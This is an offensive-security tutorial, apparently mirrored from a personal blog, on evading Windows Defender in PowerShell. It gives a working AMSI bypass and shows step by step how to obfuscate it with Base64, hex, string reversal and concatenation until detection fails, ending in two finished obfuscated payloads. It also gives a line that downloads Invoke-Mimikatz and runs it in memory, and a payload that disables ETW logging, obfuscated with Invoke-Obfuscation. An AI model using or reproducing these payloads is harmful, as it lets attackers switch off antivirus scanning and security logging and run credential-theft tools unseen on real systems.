
# <span style="color:lightblue">Bypassing AV Signatures PowerShell</span>

> NOTE : This is exactly same as my blog : https://0xstarlight.github.io/posts/Bypassing-Windows-Defender/

Windows Defender Antimalware Scan Interface (AMSI) is a security feature that is built into Windows 10 and Windows Server 2016 and later versions. AMSI is designed to provide enhanced malware protection by allowing antivirus and other security solutions to scan script-based attacks and other suspicious code before they execute on a system.

By disabling or AMSI, attackers can download malicious scripts in memory on the systems.

> Original Payload for AMSI bypass
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## <span style="color:lightgreen">Methodology - Manual</span>

1. Scan using AMSITrigger
2. Modify the detected code snippet
   1. Base64
   2. Hex
   3. Concat
   4. Reverse String
3. Rescan using AMSITrigger or Download a test ps1 script in memory
4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"

## <span style="color:lightgreen">Understanding the command</span>

This command is used to modify the behavior of the Anti-Malware Scan Interface (AMSI) in PowerShell. Specifically, it sets a private, static field within the *System.Management.Automation.AmsiUtils* class called **"amsiInitFailed"** to true, which indicates that the initialization of AMSI has failed.

Here is a breakdown of the command and what each part does:

1. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`: This first part of the command uses the `[Ref]` type accelerator to get a reference to the `System.Management.Automation` assembly and then uses the `GetType()` method to get a reference to the `System.Management.Automation.AmsiUtils` class.
   1. `System.Management.Automation.AmsiUtils` is a part of the PowerShell scripting language and is used to interact with the Anti-Malware Scan Interface (AMSI) on Windows operating systems. AMSI is a security feature that allows software to integrate with antivirus and other security products to scan and detect malicious content in scripts and other files.
   2. While `System.Management.Automation.AmsiUtils` itself is not inherently malicious, it can be flagged as such if it is being used in a context that appears suspicious to antivirus or other security software. For example, malware authors may use PowerShell scripts that leverage AMSI to bypass traditional antivirus detection and execute malicious code on a system.
   3. Thus, `System.Management.Automation.AmsiUtils` may be flagged as malicious if it is being used in a context that appears to be part of a malware attack or if it is being used in a way that violates security policies on a system.
    
2. `.GetField('amsiInitFailed','NonPublic,Static')`: This part of the command uses the `GetField()` method to get a reference to the private, static field within the *System.Management.Automation.AmsiUtils* class called `"amsiInitFailed"`. The `'NonPublic,Static'` argument specifies that the method should retrieve a non-public and static field.
    
3. `.SetValue($null,$true)`: Finally, this part of the command uses the `SetValue()` method to set the value of the `"amsiInitFailed"` field to true. The `$null` argument specifies that we are not setting the value on an instance of the object, and the `$true` argument is the new value we are setting the field to.

The reason for setting `"amsiInitFailed"` to true is to bypass AMSI detection, which may be used by antivirus or other security software to detect and block potentially malicious PowerShell commands or scripts. By indicating that the initialization of AMSI has failed, this command prevents AMSI from running and potentially interfering with the execution of PowerShell commands or scripts. It is worth noting, however, that bypassing AMSI can also make it easier for malicious actors to execute code on a system undetected, so caution should be exercised when using this command in practice.

## <span style="color:lightgreen">Running the command</span>

Lets open Powershell and execute the original payload to patch AMSI and check the result.

```powershell
PS:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/48c89446-f2a8-41ad-aeb3-d93f450f4872)

+ As we can see, Windows has identified the command as malicious and blocked it from being executed.
+ Now we need to identify what part of the payload is getting detected by Defender and triggering it to be marked as malicious.

## <span style="color:lightgreen">AMSI Trigger</span>

+ With the help of **AMSITrigger.exe**, we can identify the malicious string in the payload.

```powershell
PS C:\AMSITrigger>  .\AmsiTrigger_x64.exe
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/8c68b13f-d163-4b29-9f51-4394d7e89368)

+ We can save our payload in a `.ps1` file, and with the `-i` flag, we can supply the malicious `ps1` file

```powershell
PS C:\AMSITrigger>  .\AmsiTrigger_x64.exe -i test.ps1
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/b846c3bd-a009-40fa-a1ee-f6797931ce08)

From the output results we can see that it flagged two strings as malicious
  1. **"A m s i U t i l s"**
  2. **"a m s i I n i t F a i l e d"**


## <span style="color:lightgreen">Patching AMSI</span>

After analyzing the strings that caused Windows Defender to block our script, we can now take steps to bypass this security mechanism. Several techniques can be used to evade detection, with one of the simplest and most effective being to encode or encrypt the payload.

We can do it in the following ways
  1. Base64 Encoding
  2. Hex Encoding
  3. Reversing The String
  4. Concatenation

> Now lets try to modify our original payload using just Base64 encoding.

### <span style="color:pink">Base64 Encoding</span>

Base64 Encoding is a widely used encoding technique that converts binary data into a string of ASCII characters. This method is easy to implement and can be decoded with simple tools.

+ A simple Base64 encoding and decoding snippet in PowerShell looks like this :

```powershell
# Encoding Payload
PS:\> $Text = 'Hello World';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
# Decoding Paylaod
PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SABlAGwAbABvACAAVwBvAHIAbABkAA==')))
```


![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/ebc13c07-c4b0-4558-b66f-22276b30eeba)

+ Now we can do the same for *AmsiUtils* and *amsiInitFailed*

```powershell
PS:\> $Text = 'AmsiUtils';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/ac648e82-2d56-405f-ab8a-31e5d92a0485)

+ Windows Defender could still detect *AmsiUtils* encoded in base64. We can divide this into two pieces and concat them together to avoid getting detected.

```powershell
# Encoding Payload
PS:\> $Text = 'Amsi';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
PS:\> $Text = 'Utils';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

# Decoding Paylaod
PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/d940fc02-53cf-4f34-b269-108d0c136a14)

+ We can see this way we have encoded *AmsiUtils* without triggering Defender
+ Lets try the same for *amsiInitFailed* by splitting it into 3 parts
  1. *amsi*
  2. *Init*
  3. *Failed*

```powershell
# Encoding Payload
PS:\> $Text = 'amsi';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
PS:\> $Text = 'Init';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
PS:\> $Text = 'Failed';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

# Decoding Paylaod
PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA'))))
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/e4712ca9-4343-4e28-9d25-ef8eff1c64d2)

+ As we can see, we have encoded *amsiInitFailed* also without triggering Defender.

## <span style="color:lightgreen">Final Payload</span>

Now that we crafted the final payload to Patch AMSI, let us look back at the original AMSI bypass code.

```powershell
PS:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

+ All we need to do now is replace *AmsiUtils* and *amsiInitFailed* with the base64 encoded payload and concat the rest of the string.

```powershell
PS:\> [Ref].Assembly.GetType($('System.Management.Automation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)
```

+ For confirmation, we can download and execute `Mimikatz.ps1` in the memory and check if its triggering Defender.

```powershell
PS:\> IEX(iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/72c3622a-8fd5-4b59-9cdd-594049afd9fe)

As you can see, we successfully encoded the AMSI bypass payload in base64. Below I will give a demonstration on how to encode it in hex and use techniques like reverse string and concatenation

### <span style="color:pink">Concatenation</span>

An easy was of bypassing **"A m s i U t i l s"** is by simply splitting it into two words and adding them together.

```powershell
PS:\> 'AmsiUtils'
PS:\> 'Amsi' + 'Utils'
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/2600288f-d266-48b5-af41-f9b96e488368)


### <span style="color:pink">Hex Encoding</span>

A simple Hex encoding and decoding snippet in PowerShell looks like this :

```powershell
# Encoding Payload
PS:\> "Hello World" | Format-Hex

# Decoding Payload
PS:\> $r = '48 65 6C 6C 6F 20 57 6F 72 6C 64'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_} 
PS C:\> $s
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/e6246d82-274e-4793-bdf7-11c3a90aaa0d)


### <span style="color:pink">Reverse String</span>

The last technique is by reversing the string for obfuscating the payload.

```powershell
# Encoding Payload
PS:\> (([regex]::Matches("testing payload",'.','RightToLeft') | foreach {$_.value}) -join '')

# Decoding Payload
PS:\> (([regex]::Matches("daolyap gnitset",'.','RightToLeft') | foreach {$_.value}) -join '')
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/bd5caded-ebae-4f29-a8fa-31eb49e8bed1)

## <span style="color:lightgreen">Final Payload - 2</span>

We can also combine these techniques to create a more powerful and effective payload that can evade detection by Windows Defender. Using a combination of Base64 Encoding, Hex Encoding, Reversing The String, and Concatenation, we can create a highly obfuscated payload to bypass Windows Defender.

```powershell
PS:\> $w = 'System.Manag';$r = '65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 2e'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_};$c = 'Amsi'+'Utils';$assembly = [Ref].Assembly.GetType(('{0}{1}{2}' -f $w,$s,$c));$n = $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAA==')));$b = 'siIn';$k = (([regex]::Matches("deliaFti",'.','RightToLeft') | foreach {$_.value}) -join '');$field = $assembly.GetField(('{0}{1}{2}' -f $n,$b,$k),'NonPublic,Static');$field.SetValue($null,$true)
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/d45a6949-de22-458f-b69e-2ced47026585)


# <span style="color:lightblue">Patching Event Tracing for Windows</span>

Event Tracing for Windows (ETW) is a powerful logging and tracing mechanism in the Windows operating system that allows developers, administrators, and analysts to monitor and diagnose system events in real time. It collects and analyses diagnostic and performance data from applications and services running on Windows. ETW records events generated by the operating system and applications, including information on processes, threads, disk I/O, network activity, and more.

By disabling or manipulating ETW, attackers can prevent security tools from logging their actions or tracking their movement within a system.

> Original Payload to patch ETW
```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

## <span style="color:lightgreen">Understanding the command</span>

This command is used to modify the behavior of the Event Tracing for Windows(ETW) in PowerShell. Specifically, it sets a private, static field within the *System.Management.Automation.Tracing.PSEtwLogProvider* class called `"m_enabled"` to true, `0` indicates that the initialization of ETW is disabled.

Here is a breakdown of the command and what each part does:

1. `[Reflection.Assembly]::LoadWithPartialName('System.Core')` loads the `System.Core` assembly into memory.
2. `.GetType('System.Diagnostics.Eventing.EventProvider')` retrieves the `EventProvider` type from the loaded assembly.
3. `.GetField('m_enabled','NonPublic,Instance')` retrieves the `m_enabled` field of the **EventProvider** type, which determines whether event tracing is enabled for that provider.
4. `.SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)` sets the `m_enabled` field of the PowerShell ETW provider to `0` (disabled). This prevents PowerShell from logging events to the Windows Event Log or other ETW consumers.

## <span style="color:lightgreen">Patching ETW</span>

We have already learned how to patch PowerShell scripts manually. I will explain how to obfuscate Powershell using **Invoke-Obfuscation** for this example. I already have this setup on my Commando-VM. 

+ First thing is that we can launch **Invoke-Obfuscation**

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/c642ce31-8cd8-49f4-a70f-6d5ce9dd2a06)

+ We can set our payload and use AES encryption to encrypt our payload.

```powershell
Invoke-Obfuscation> SET SCRIPT BLOCK [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

Invoke-Obfuscation> ENCODING
Invoke-Obfuscation> ENCODING\5
```

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/a3c9c816-38ab-4582-b72c-5005e1f85193)

+ The encrypted payload will be visible at the end of the screen.

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/9f11eac3-2246-43ad-8170-962a1dcc1e85)

+ Now we can execute the payload. Before doing that, we need to understand why we have encrypted the payload and what the payload does. First, lets directly execute the payload.

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/5a6c41bb-91dc-46eb-bb0d-4c7528e87721)

+ As we can see that Defender has detected our encrypted payload, this is because it's encryption which will be decrypted and get executed. Hence will help in bypassing Static analysis only. We can better understand if we execute the command without executing it.

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/89b97d00-0dec-4985-93e4-20de83a3212b)

+ To circumvent this security measure, we can bypass AMSI and then execute the desired command.

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/14645a88-363c-46d7-8294-d953f3ed8b9a)

+ It's worth noting that while we can bypass AMSI and execute the raw payload to disable ETW, doing so may result in detecting and logging the attack in the PowerShell history file. As a result, it is recommended to use additional techniques such as encoding or obfuscation to evade detection and prevent attack logging.

![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/39465655-54a6-4dba-97fe-481c54b0346b)


# <span style="color:lightblue">Tools Used</span>
1. [AmsiTrigger](https://github.com/RythmStick/AMSITrigger)
2. [Invoke-obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
